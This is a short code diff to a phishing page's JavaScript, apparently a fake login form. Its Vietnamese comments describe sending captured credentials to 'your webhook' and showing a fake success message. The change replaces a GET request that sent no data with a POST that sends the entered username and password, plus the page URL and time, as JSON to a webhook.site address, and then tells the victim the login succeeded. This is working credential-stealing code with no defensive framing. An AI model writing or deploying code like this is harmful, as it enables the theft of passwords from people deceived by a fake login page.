@@ -25,18 +25,27 @@ document.getElementById('fakeLogin').addEventListener('submit', function(e) {
   const username = document.getElementById('user').value;
   const password = document.getElementById('pass').value;
 
+
   if (username && password) {
-    const params = new URLSearchParams({
-      username: username,
-      password: password,
-    });
-
+    // Gửi credentials về webhook của bạn
     const webhook = "https://webhook.site/12f0844f-6a73-46ee-83cc-768b9c88af4c";
-
+    
     fetch(webhook, {
-      method: 'GET'
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: username,
+        password: password,
+        url: location.href,
+        time: new Date().toISOString()
+      })
     });
-	
-	alert("Đăng nhập thành công! Đang chuyển hướng...");
+
+    // Hiển thị thông báo giả
+    alert("Đăng nhập thành công! Đang chuyển hướng...");
+    
+    // Tùy chọn: submit form thật hoặc redirect về trang gốc
+  
   }
 });
